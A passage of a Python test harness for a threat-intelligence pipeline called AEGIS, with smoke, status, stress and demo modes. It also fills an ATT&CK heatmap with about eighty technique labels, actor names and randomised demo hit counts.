              ["initial-access"], event_id="SMOKE-stix"),
        _misp("Smoke test MISP event", ["T1190"], ["TestActor"],
              event_id="SMOKE-misp"),
    ]

    for ev in test_events:
        r.xadd(INBOUND_STREAM, ev, maxlen=50_000)
        src = ev["source_type"]
        print(f"  > Injected {src:<12} → {ev['event_id']}")

    # Wait for orchestrator to route them
    print(f"\n  Waiting for orchestrator to route events...", end="", flush=True)
    timeout = 30
    expected_growth = len(test_events)
    start = time.time()

    while time.time() - start < timeout:
        time.sleep(1)
        print(".", end="", flush=True)
        total_new = 0
        for name, key in ALL_QUEUES.items():
            if name == "inbound":
                continue
            now = r.xlen(key)
            total_new += max(0, now - before.get(name, 0))
        if total_new >= expected_growth:
            break

    print()

    # Check results
    after = {}
    for name, key in ALL_QUEUES.items():
        after[name] = r.xlen(key)

    passed = 0
    failed = 0
    for ev in test_events:
        src = ev["source_type"]
        expected_queue = routing.get(src, "triage")
        queue_key = f"aegis:queue:{expected_queue}"
        queue_name = expected_queue
        grew = after.get(queue_name, 0) > before.get(queue_name, 0)

        status = "PASS" if grew else "FAIL"
        color = "\033[92m" if grew else "\033[91m"
        reset = "\033[0m"

        print(f"  {color}[{status}]{reset}  {src:<12} → {queue_name:<12} "
              f"(before={before.get(queue_name, 0)}, after={after.get(queue_name, 0)})")

        if grew:
            passed += 1
        else:
            failed += 1

    print(f"\n  Results: {passed} passed, {failed} failed")
    return failed == 0


# ══════════════════════════════════════════════════════════════════════════════
# STATUS
# ══════════════════════════════════════════════════════════════════════════════

def print_status(r: redis.Redis) -> None:
    """Print pipeline health dashboard."""
    print("\n  AEGIS Pipeline Status")
    print("  " + "─" * 60)

    # Stream/queue lengths
    print("\n  Stream / Queue Depths:")
    for name, key in ALL_QUEUES.items():
        length = r.xlen(key)
        bar = "█" * min(length, 50) if length > 0 else "·"
        print(f"    {name:<14} {length:>6}  {bar}")

    # Consumer group info
    print("\n  Consumer Groups:")
    for name, key in ALL_QUEUES.items():
        try:
            groups = r.xinfo_groups(key)
            for g in groups:
                gname = g.get("name", "?")
                if isinstance(gname, bytes):
                    gname = gname.decode()
                pending = g.get("pending", 0)
                lag = g.get("lag", "?")
                consumers = g.get("consumers", 0)
                print(f"    {name:<14} group={gname:<24} consumers={consumers}  "
                      f"pending={pending}  lag={lag}")
        except redis.ResponseError:
            pass

    # Atomic Red Team data
    atomic_count = r.hlen("aegis:atomic:tests")
    print(f"\n  Atomic Red Team: {atomic_count} techniques loaded")

    # TTP hits
    ttp_count = r.hlen("aegis:ttp:hits")
    print(f"  ATT&CK TTP hits: {ttp_count} techniques tracked")

    # Advisories in PostgreSQL stream
    adv_count = r.xlen("aegis:stream:advisories")
    print(f"  Advisory stream: {adv_count} advisories persisted")

    print()


# ══════════════════════════════════════════════════════════════════════════════
# ATTACK MAP – populate the ATT&CK heatmap with realistic TTP data
# ══════════════════════════════════════════════════════════════════════════════

# (technique_id, name, tactic, hits_range, priority, actors, platforms)
ATTACK_MAP_DATA: list[tuple[str, str, str, tuple[int, int], str, list[str], list[str]]] = [
    # ── Reconnaissance ────────────────────────────────────────────────────
    ("T1595.001", "Scanning IP Blocks",                   "reconnaissance",       (5, 30),   "P2", ["Volt Typhoon", "Lazarus Group"],  ["PRE"]),
    ("T1595.002", "Vulnerability Scanning",               "reconnaissance",       (15, 60),  "P1", ["APT29", "Volt Typhoon"],           ["PRE"]),
    ("T1589.001", "Gather Victim Identity — Credentials", "reconnaissance",       (3, 20),   "P2", ["APT29", "Lazarus Group"],          ["PRE"]),
    ("T1591.004", "Gather Victim Org — Network Topology", "reconnaissance",       (2, 15),   "P3", ["Volt Typhoon"],                    ["PRE"]),
    ("T1598.003", "Spearphishing for Information",        "reconnaissance",       (8, 35),   "P1", ["APT29"],                           ["PRE"]),

    # ── Resource Development ──────────────────────────────────────────────
    ("T1583.001", "Acquire Infrastructure — Domains",     "resource-development", (4, 25),   "P2", ["LockBit", "BlackCat"],             ["PRE"]),
    ("T1583.003", "Acquire Infrastructure — VPS",         "resource-development", (6, 30),   "P2", ["APT29", "Lazarus Group"],          ["PRE"]),
    ("T1587.001", "Develop Capabilities — Malware",       "resource-development", (3, 18),   "P1", ["Lazarus Group", "Sandworm"],       ["PRE"]),
    ("T1588.002", "Obtain Capabilities — Tool",           "resource-development", (8, 40),   "P2", ["LockBit", "BlackCat"],             ["PRE"]),
    ("T1585.001", "Establish Accounts — Social Media",    "resource-development", (2, 12),   "P3", ["APT29"],                           ["PRE"]),

    # ── Initial Access ────────────────────────────────────────────────────
    ("T1190",     "Exploit Public-Facing Application",    "initial-access",       (40, 150), "P0", ["Volt Typhoon", "APT29", "LockBit"], ["Linux", "Windows", "Network"]),
    ("T1133",     "External Remote Services",             "initial-access",       (25, 90),  "P0", ["Volt Typhoon", "LockBit"],          ["Linux", "Windows", "Network"]),
    ("T1566.001", "Spearphishing Attachment",             "initial-access",       (30, 120), "P0", ["APT29", "Lazarus Group"],           ["Linux", "Windows", "macOS"]),
    ("T1566.002", "Spearphishing Link",                   "initial-access",       (20, 80),  "P1", ["APT29", "Lazarus Group"],           ["Linux", "Windows", "macOS"]),
    ("T1195.002", "Compromise Supply Chain",              "initial-access",       (5, 30),   "P0", ["Lazarus Group"],                    ["Linux", "Windows", "macOS"]),
    ("T1189",     "Drive-by Compromise",                  "initial-access",       (8, 40),   "P1", ["Lazarus Group", "APT29"],           ["Linux", "Windows", "macOS"]),
    ("T1078",     "Valid Accounts",                       "initial-access",       (35, 100), "P0", ["Volt Typhoon", "APT29"],            ["Linux", "Windows", "macOS", "Cloud"]),

    # ── Execution ─────────────────────────────────────────────────────────
    ("T1059.001", "PowerShell",                           "execution",            (50, 200), "P0", ["APT29", "LockBit", "BlackCat"],     ["Windows"]),
    ("T1059.003", "Windows Command Shell",                "execution",            (30, 120), "P1", ["LockBit", "BlackCat"],              ["Windows"]),
    ("T1059.004", "Unix Shell",                           "execution",            (20, 80),  "P1", ["Volt Typhoon", "Sandworm"],         ["Linux", "macOS"]),
    ("T1059.007", "JavaScript",                           "execution",            (8, 35),   "P2", ["Lazarus Group"],                    ["Linux", "Windows", "macOS"]),
    ("T1053.005", "Scheduled Task",                       "execution",            (15, 60),  "P1", ["APT29", "LockBit"],                 ["Windows"]),
    ("T1047",     "WMI",                                  "execution",            (12, 50),  "P1", ["APT29", "Volt Typhoon"],            ["Windows"]),
    ("T1204.001", "Malicious Link",                       "execution",            (18, 70),  "P1", ["APT29", "Lazarus Group"],           ["Linux", "Windows", "macOS"]),
    ("T1204.002", "Malicious File",                       "execution",            (25, 90),  "P1", ["LockBit", "BlackCat"],              ["Linux", "Windows", "macOS"]),

    # ── Persistence ───────────────────────────────────────────────────────
    ("T1505.003", "Web Shell",                            "persistence",          (20, 80),  "P0", ["Volt Typhoon", "APT29"],            ["Linux", "Windows", "Network"]),
    ("T1547.001", "Registry Run Keys / Startup Folder",   "persistence",          (25, 100), "P1", ["APT29", "LockBit"],                 ["Windows"]),
    ("T1543.003", "Windows Service",                      "persistence",          (10, 50),  "P1", ["LockBit", "BlackCat"],              ["Windows"]),
    ("T1136.001", "Create Account — Local",               "persistence",          (8, 35),   "P1", ["Volt Typhoon"],                     ["Linux", "Windows", "macOS"]),
    ("T1098",     "Account Manipulation",                 "persistence",          (12, 45),  "P1", ["APT29", "Volt Typhoon"],            ["Linux", "Windows", "macOS", "Cloud"]),

    # ── Privilege Escalation ──────────────────────────────────────────────
    ("T1068",     "Exploitation for Privilege Escalation", "privilege-escalation", (15, 60),  "P0", ["APT29", "Volt Typhoon"],           ["Linux", "Windows", "macOS"]),
    ("T1134",     "Access Token Manipulation",            "privilege-escalation", (10, 45),  "P1", ["APT29"],                            ["Windows"]),
    ("T1548.002", "Bypass User Account Control",          "privilege-escalation", (18, 70),  "P1", ["LockBit", "BlackCat"],              ["Windows"]),
    ("T1055",     "Process Injection",                    "privilege-escalation", (22, 85),  "P0", ["APT29", "Lazarus Group"],           ["Linux", "Windows", "macOS"]),
    ("T1484.001", "Group Policy Modification",            "privilege-escalation", (5, 25),   "P0", ["Volt Typhoon"],                     ["Windows"]),

    # ── Defense Evasion ───────────────────────────────────────────────────
    ("T1027",     "Obfuscated Files or Information",      "defense-evasion",      (35, 140), "P1", ["APT29", "LockBit", "Lazarus Group"], ["Linux", "Windows", "macOS"]),
    ("T1070.004", "Indicator Removal — File Deletion",    "defense-evasion",      (20, 80),  "P1", ["Volt Typhoon", "APT29"],            ["Linux", "Windows", "macOS"]),
    ("T1562.001", "Disable or Modify Tools",              "defense-evasion",      (15, 60),  "P0", ["LockBit", "BlackCat"],              ["Linux", "Windows", "macOS", "Cloud"]),
    ("T1112",     "Modify Registry",                      "defense-evasion",      (12, 50),  "P2", ["APT29"],                            ["Windows"]),
    ("T1036.005", "Masquerading — Match Legitimate Name",  "defense-evasion",     (18, 70),  "P1", ["APT29", "LockBit"],                 ["Linux", "Windows", "macOS"]),
    ("T1140",     "Deobfuscate/Decode Files",             "defense-evasion",      (10, 45),  "P2", ["Lazarus Group", "APT29"],           ["Linux", "Windows", "macOS"]),
    ("T1218.011", "Rundll32",                             "defense-evasion",      (14, 55),  "P1", ["APT29", "LockBit"],                 ["Windows"]),

    # ── Credential Access ─────────────────────────────────────────────────
    ("T1003.001", "LSASS Memory",                         "credential-access",    (30, 120), "P0", ["APT29", "LockBit"],                 ["Windows"]),
    ("T1003.006", "DCSync",                               "credential-access",    (10, 45),  "P0", ["APT29"],                            ["Windows"]),
    ("T1555.003", "Credentials from Web Browsers",        "credential-access",    (20, 80),  "P1", ["Lazarus Group", "APT29"],           ["Linux", "Windows", "macOS"]),
    ("T1558.003", "Kerberoasting",                        "credential-access",    (15, 60),  "P1", ["APT29", "LockBit"],                 ["Windows"]),
    ("T1110.001", "Brute Force — Password Guessing",      "credential-access",    (25, 90),  "P1", ["Volt Typhoon"],                     ["Linux", "Windows", "macOS", "Cloud"]),
    ("T1552.001", "Credentials in Files",                 "credential-access",    (12, 50),  "P1", ["Lazarus Group"],                    ["Linux", "Windows", "macOS", "Cloud"]),

    # ── Discovery ─────────────────────────────────────────────────────────
    ("T1087.002", "Account Discovery — Domain",           "discovery",            (20, 75),  "P2", ["APT29", "Volt Typhoon"],            ["Windows"]),
    ("T1082",     "System Information Discovery",         "discovery",            (30, 110), "P2", ["APT29", "Lazarus Group", "Volt Typhoon"], ["Linux", "Windows", "macOS"]),
    ("T1083",     "File and Directory Discovery",         "discovery",            (25, 90),  "P2", ["APT29", "LockBit"],                 ["Linux", "Windows", "macOS"]),
    ("T1018",     "Remote System Discovery",              "discovery",            (18, 65),  "P2", ["Volt Typhoon", "LockBit"],          ["Linux", "Windows", "macOS"]),
    ("T1016",     "System Network Configuration Discovery", "discovery",          (15, 55),  "P2", ["Volt Typhoon"],                     ["Linux", "Windows", "macOS"]),
    ("T1049",     "System Network Connections Discovery",  "discovery",           (12, 45),  "P2", ["APT29"],                            ["Linux", "Windows", "macOS"]),

    # ── Lateral Movement ──────────────────────────────────────────────────
    ("T1021.001", "Remote Desktop Protocol",              "lateral-movement",     (30, 120), "P0", ["APT29", "LockBit"],                 ["Windows"]),
    ("T1021.002", "SMB/Windows Admin Shares",             "lateral-movement",     (25, 100), "P0", ["LockBit", "BlackCat", "Volt Typhoon"], ["Windows"]),
    ("T1021.006", "Windows Remote Management",            "lateral-movement",     (10, 40),  "P1", ["Volt Typhoon"],                     ["Windows"]),
    ("T1550.002", "Pass the Hash",                        "lateral-movement",     (15, 55),  "P0", ["APT29", "LockBit"],                 ["Windows"]),
    ("T1570",     "Lateral Tool Transfer",                "lateral-movement",     (12, 50),  "P1", ["APT29", "Lazarus Group"],           ["Linux", "Windows", "macOS"]),

    # ── Collection ────────────────────────────────────────────────────────
    ("T1005",     "Data from Local System",               "collection",           (20, 80),  "P1", ["APT29", "Lazarus Group"],           ["Linux", "Windows", "macOS"]),
    ("T1074.001", "Data Staged — Local",                  "collection",           (10, 45),  "P1", ["APT29", "LockBit"],                 ["Linux", "Windows", "macOS"]),
    ("T1560.001", "Archive Collected Data — Utility",     "collection",           (8, 35),   "P1", ["APT29"],                            ["Linux", "Windows", "macOS"]),
    ("T1114.002", "Email Collection — Remote",            "collection",           (6, 28),   "P2", ["APT29"],                            ["Cloud", "Windows"]),
    ("T1119",     "Automated Collection",                 "collection",           (5, 22),   "P2", ["Volt Typhoon"],                     ["Linux", "Windows", "macOS"]),

    # ── Command and Control ───────────────────────────────────────────────
    ("T1071.001", "Application Layer Protocol — Web",     "command-and-control",  (35, 130), "P1", ["APT29", "LockBit", "Lazarus Group"], ["Linux", "Windows", "macOS"]),
    ("T1071.004", "Application Layer Protocol — DNS",     "command-and-control",  (8, 35),   "P1", ["Volt Typhoon"],                     ["Linux", "Windows", "macOS"]),
    ("T1105",     "Ingress Tool Transfer",                "command-and-control",  (25, 100), "P1", ["APT29", "LockBit", "Lazarus Group"], ["Linux", "Windows", "macOS"]),
    ("T1572",     "Protocol Tunneling",                   "command-and-control",  (10, 40),  "P1", ["Volt Typhoon"],                     ["Linux", "Windows", "macOS"]),
    ("T1573.001", "Encrypted Channel — Symmetric",        "command-and-control",  (15, 55),  "P2", ["APT29", "Lazarus Group"],           ["Linux", "Windows", "macOS"]),
    ("T1008",     "Fallback Channels",                    "command-and-control",  (5, 20),   "P2", ["APT29"],                            ["Linux", "Windows", "macOS"]),

    # ── Exfiltration ──────────────────────────────────────────────────────
    ("T1041",     "Exfiltration Over C2 Channel",         "exfiltration",         (20, 80),  "P1", ["APT29", "Lazarus Group"],           ["Linux", "Windows", "macOS"]),
    ("T1048.002", "Exfiltration Over Alternative Protocol", "exfiltration",       (8, 35),   "P1", ["Lazarus Group"],                    ["Linux", "Windows", "macOS"]),
    ("T1567.002", "Exfiltration to Cloud Storage",        "exfiltration",         (10, 40),  "P1", ["APT29"],                            ["Linux", "Windows", "macOS"]),
    ("T1030",     "Data Transfer Size Limits",            "exfiltration",         (6, 25),   "P2", ["APT29"],                            ["Linux", "Windows", "macOS"]),
    ("T1537",     "Transfer Data to Cloud Account",       "exfiltration",         (4, 18),   "P2", ["Lazarus Group"],                    ["Cloud"]),

    # ── Impact ────────────────────────────────────────────────────────────
    ("T1486",     "Data Encrypted for Impact",            "impact",               (25, 100), "P0", ["LockBit", "BlackCat"],              ["Linux", "Windows", "macOS"]),
    ("T1490",     "Inhibit System Recovery",              "impact",               (20, 80),  "P0", ["LockBit", "BlackCat"],              ["Linux", "Windows", "macOS"]),
    ("T1485",     "Data Destruction",                     "impact",               (8, 35),   "P0", ["Sandworm"],                         ["Linux", "Windows", "macOS"]),
    ("T1489",     "Service Stop",                         "impact",               (12, 50),  "P1", ["LockBit", "BlackCat"],              ["Linux", "Windows", "macOS"]),
    ("T1561.002", "Disk Wipe — Disk Structure",           "impact",               (5, 20),   "P0", ["Sandworm"],                         ["Linux", "Windows"]),
]

# Default infrastructure profile — typical enterprise with Windows AD + Linux servers + cloud
DEFAULT_INFRA_PROFILE = [
    "Windows", "Linux", "Network", "Cloud",
]


def populate_attack_map(r: redis.Redis) -> None:
    """Write comprehensive TTP data to Redis for the ATT&CK heatmap."""
    print(f"\n  Populating ATT&CK matrix with {len(ATTACK_MAP_DATA)} techniques...\n")

    pipe = r.pipeline()
    by_tactic: dict[str, int] = {}

    for tid, name, tactic, (lo, hi), priority, actors, platforms in ATTACK_MAP_DATA:
        hits = random.randint(lo, hi)
        pipe.hset("aegis:ttp:hits", tid, hits)
        pipe.hset("aegis:ttp:name", tid, name)
        pipe.hset("aegis:ttp:tactic", tid, tactic)
        pipe.hset("aegis:ttp:priority", tid, priority)
        pipe.hset("aegis:ttp:actors", tid, ",".join(actors))
        pipe.hset("aegis:ttp:platforms", tid, ",".join(platforms))
        by_tactic[tactic] = by_tactic.get(tactic, 0) + 1

    # Set default infrastructure profile
    pipe.delete("aegis:infra:platforms")
    for plat in DEFAULT_INFRA_PROFILE:
        pipe.sadd("aegis:infra:platforms", plat)

    pipe.set("aegis:ttp:updated_at", _now())
    pipe.execute()

    # Print summary by tactic
    tactic_order = [
        "reconnaissance", "resource-development", "initial-access", "execution",
        "persistence", "privilege-escalation", "defense-evasion", "credential-access",
        "discovery", "lateral-movement", "collection", "command-and-control",
        "exfiltration", "impact",
    ]
    for tactic in tactic_order:
        count = by_tactic.get(tactic, 0)
        bar = "█" * count
        print(f"    {tactic:<24} {count:>2} techniques  {bar}")

    total = r.hlen("aegis:ttp:hits")
    print(f"\n  Done. {total} total techniques in ATT&CK heatmap.")

    # Publish ttp_update so the UI refreshes live
    import json as _json
    r.publish("aegis:broadcast", _json.dumps({
        "type": "ttp_update",
        "technique_count": total,
    }))
    print("  Published ttp_update to WebSocket clients.")


# ══════════════════════════════════════════════════════════════════════════════
# INJECTION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

def inject(
    r: redis.Redis,
    events: list[dict[str, str]],
    stream_mode: bool = False,
    delay: float = 3.0,
    target_stream: str = INBOUND_STREAM,
) -> list[str]:
    """Inject events and return stream IDs."""
    ids = []
    for i, event in enumerate(events, 1):
        source = event["source_type"]
        payload = json.loads(event["raw_payload"])

        label = (
            payload.get("cve_id")
            or payload.get("vulnerability_name", "")[:40]
            or payload.get("title", "")[:40]
            or payload.get("info", "")[:40]
            or payload.get("rule_name", "")[:40]
            or payload.get("ioc_value", "")
            or (payload.get("objects", [{}])[0].get("name", "") if payload.get("objects") else "")[:40]
            or "unknown"
        )

        priority = event.get("priority", "—")
        eid = event.get("event_id", "?")[:20]

        stream_id = r.xadd(target_stream, event, maxlen=50_000)
        ids.append(stream_id)

        print(
            f"  [{i:>3}/{len(events)}]  {source:<12}  {priority:<4}  "
            f"{eid:<22}  {label:<42}  → {stream_id}"
        )

        if stream_mode and i < len(events):
            time.sleep(delay)

    return ids


# ══════════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    parser = argparse.ArgumentParser(
        description="AEGIS Test Harness & Demo Data Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  demo        Inject 30+ curated events for a compelling dashboard demo
  scenario    Run a named attack scenario (apt29-intrusion, ransomware-response, supply-chain)
  attack-map     Populate ATT&CK heatmap with 80+ techniques across all 14 tactics
  infra-profile  Set or view the organisation's infrastructure profile for ATT&CK filtering
  stress         Flood pipeline with N randomised events for throughput testing
  smoke          Quick validation — one event per source type, verify routing
  status         Print pipeline health: queue depths, consumer lag, stream lengths
        """,
    )
    parser.add_argument("mode", choices=["demo", "scenario", "stress", "smoke", "status", "attack-map", "infra-profile"],
                        help="Harness mode")
    parser.add_argument("--platforms", nargs="*", default=None,
                        help="Platform list for infra-profile mode (e.g. Windows Linux Cloud)")
    parser.add_argument("--redis", default=None,
                        help="Redis URL (default: $REDIS_URL or redis://localhost:6379)")
    parser.add_argument("--stream", action="store_true",
                        help="Stream mode: inject with delay between events")
    parser.add_argument("--delay", type=float, default=3.0,
                        help="Delay between events in stream mode (default: 3s)")
    parser.add_argument("--name", default=None,
                        help="Scenario name (for scenario mode)")
    parser.add_argument("--count", type=int, default=200,
                        help="Number of events for stress mode (default: 200)")
    parser.add_argument("--rate", type=float, default=0,
                        help="Events per second for stress mode (0=burst)")
    parser.add_argument("--shuffle", action="store_true",
                        help="Randomize event order (demo/stress modes)")
    parser.add_argument("--all-scenarios", action="store_true",
                        help="Run all scenarios sequentially")
    args = parser.parse_args()

    redis_url = args.redis or os.getenv("REDIS_URL", "redis://localhost:6379")
    r = redis.from_url(redis_url, decode_responses=True)

    try:
        r.ping()
    except redis.ConnectionError:
        print(f"ERROR: Cannot connect to Redis at {redis_url}")
        sys.exit(1)

    print("=" * 76)
    print("  AEGIS Test Harness")
    print("=" * 76)
    print(f"  Redis: {redis_url}")

    # ── Status mode ───────────────────────────────────────────────────────
    if args.mode == "status":
        print_status(r)
        return

    # ── Attack map mode ───────────────────────────────────────────────────
    if args.mode == "attack-map":
        populate_attack_map(r)
        return

    # ── Infra profile mode ─────────────────────────────────────────────
    if args.mode == "infra-profile":
        INFRA_KEY = "aegis:infra:platforms"
        VALID_PLATFORMS = {"Windows", "Linux", "macOS", "Cloud", "Network", "PRE"}
        if args.platforms is not None:
            # Set mode
            invalid = [p for p in args.platforms if p not in VALID_PLATFORMS]
            if invalid:
                print(f"  ERROR: Unknown platforms: {', '.join(invalid)}")
                print(f"  Valid platforms: {', '.join(sorted(VALID_PLATFORMS))}")
                sys.exit(1)
            r.delete(INFRA_KEY)
            if args.platforms:
                r.sadd(INFRA_KEY, *args.platforms)
            print(f"\n  Infrastructure profile set: {', '.join(sorted(args.platforms)) or '(empty)'}")
        else:
            # View mode
            current = r.smembers(INFRA_KEY)
            if current:
                print(f"\n  Current infrastructure profile: {', '.join(sorted(current))}")
            else:
                print(f"\n  No infrastructure profile set.")
                print(f"  Set one with: aegis_harness.py infra-profile --platforms Windows Linux Cloud")
        print(f"  Valid platforms: {', '.join(sorted(VALID_PLATFORMS))}")
        return

    # ── Smoke mode ────────────────────────────────────────────────────────
    if args.mode == "smoke":
        ok = run_smoke(r)
        sys.exit(0 if ok else 1)

    # ── Demo mode ─────────────────────────────────────────────────────────
    if args.mode == "demo":
        events = build_demo_events()
        if args.shuffle:
            random.shuffle(events)

        # Summary
        by_source: dict[str, int] = {}
        by_priority: dict[str, int] = {}
        for e in events:
            by_source[e["source_type"]] = by_source.get(e["source_type"], 0) + 1
            p = e.get("priority", "—")
            by_priority[p] = by_priority.get(p, 0) + 1

        print(f"\n  Mode: DEMO — {len(events)} curated events\n")
        print("  Source breakdown:")
        for src, cnt in sorted(by_source.items()):
            print(f"    {src:<12}  {cnt}")
        print(f"\n  Priority breakdown:")
        for pri, cnt in sorted(by_priority.items()):
            print(f"    {pri:<4}  {cnt}")
        print()

        inject(r, events, stream_mode=args.stream, delay=args.delay)
        print(f"\n  Done. {len(events)} events injected.")
        print(f"  Inbound stream length: {r.xlen(INBOUND_STREAM)}")
        return

    # ── Scenario mode ─────────────────────────────────────────────────────
    if args.mode == "scenario":
        if args.all_scenarios:
            scenario_names = list(SCENARIOS.keys())
        elif args.name:
            scenario_names = [args.name]
        else:
            print(f"\n  Available scenarios: {', '.join(SCENARIOS.keys())}")
            print("  Use --name <scenario> or --all-scenarios")
            sys.exit(1)

        for sname in scenario_names:
            if sname not in SCENARIOS:
                print(f"  ERROR: Unknown scenario '{sname}'")
                print(f"  Available: {', '.join(SCENARIOS.keys())}")
                sys.exit(1)

            timed_events = SCENARIOS[sname]()
            print(f"\n  Scenario: {sname} — {len(timed_events)} events")
            print("  " + "─" * 60)

            for delay_s, event in timed_events:
                if delay_s > 0:
                    print(f"\n  ⏱  waiting {delay_s}s...", flush=True)
                    time.sleep(delay_s)

                source = event["source_type"]
                eid = event.get("event_id", "?")
                payload = json.loads(event["raw_payload"])
                label = (payload.get("cve_id") or payload.get("title", "")[:40]
                         or payload.get("info", "")[:40] or payload.get("rule_name", "")[:40]
                         or payload.get("ioc_value", "") or "event")

                stream_id = r.xadd(INBOUND_STREAM, event, maxlen=50_000)
                print(f"  > [{source:<12}] {eid:<26} {label:<40} → {stream_id}")

            print(f"\n  Scenario '{sname}' complete.")

        print(f"\n  Inbound stream length: {r.xlen(INBOUND_STREAM)}")
        return

    # ── Stress mode ───────────────────────────────────────────────────────
    if args.mode == "stress":
        events = build_stress_events(args.count)
        print(f"\n  Mode: STRESS — {args.count} randomised events")
        if args.rate > 0:
            delay = 1.0 / args.rate
            print(f"  Rate: {args.rate} events/sec ({delay:.3f}s delay)\n")
            stream_mode = True
        else:
            delay = 0
            print("  Rate: burst (no delay)\n")
            stream_mode = False

        t0 = time.time()
        inject(r, events, stream_mode=stream_mode, delay=delay)
        elapsed = time.time() - t0

        print(f"\n  Done. {args.count} events in {elapsed:.1f}s "
              f"({args.count / elapsed:.1f} events/sec)")
        print(f"  Inbound stream length: {r.xlen(INBOUND_STREAM)}")
        return


if __name__ == "__main__":
    main()
